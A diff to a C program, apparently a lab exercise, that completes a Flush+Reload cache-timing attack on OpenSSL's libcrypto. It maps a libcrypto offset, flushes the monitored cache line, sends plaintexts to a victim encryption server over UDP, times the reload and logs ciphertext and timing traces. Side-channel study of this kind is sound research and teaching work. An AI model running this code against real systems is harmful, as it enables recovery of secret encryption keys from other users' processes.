@@ -131,14 +131,17 @@ void savePlaintext()
     if(plainFP == NULL)
         return;
     fwrite(plaintext, sizeof(uint8_t), 16, plainFP);
+    fwrite("\n", sizeof(uint8_t), 1, plainFP);
 }
 void saveCiphertext()
 {
     fwrite(ciphertext, sizeof(uint8_t), 16, cipherFP);
+    fwrite("\n", sizeof(uint8_t), 1, cipherFP);
 }
 void saveTiming()
 {
-    fwrite(timing, sizeof(uint32_t), 1, timingFP);
+    fprintf(timingFP, "%d\n", *timing);
+    // fwrite(timing, sizeof(uint32_t), 1, timingFP);
 }
 void saveTrace()
 {
@@ -185,11 +188,29 @@ uint32_t reload(void *target)
  */
 void doTrace()
 {
+    int err;
     // generate a new plaintext
+    generatePlaintext();
     // set the cache to a known state
+    clflush(target);
     // ask victim for an encryption
+    if ( (err = sendto(s, plaintext, sizeof(plaintext)*16, 0, (struct sockaddr *) &server, (socklen_t) sizeof(server))) < 0)
+    {
+        printf("Unable to send data correctly\n");
+        return;
+    }
+    
+    socklen_t serverlen = (socklen_t) sizeof(server);
+    if ( (err = recvfrom(s, ciphertext, sizeof(ciphertext)*16, 0, (struct sockaddr *) &server, &serverlen)) < 0)
+    {
+        printf("Unable to receive data correctly\n");
+        return;
+    }
     // check current cache state
+    *timing = reload(target);
     // record timing and ciphertext
+
+    saveTrace();
 #ifdef DEBUG
     printText(ciphertext, 16, "ciphertext");
     printf("Timing: %i\n", *timing);
@@ -236,9 +257,9 @@ void init()
 
     // setup the target for monitoring
     printf("setting up target\n");
-    target = ;
+    target = map_offset("openssl/libcrypto.so", offset);
 
-    printf("file offset: %x\n", offset);
+    printf("file offset: %zu\n", offset);
     printf("target address: %p\n", target);
     printText(target, 16, "target values:");
 
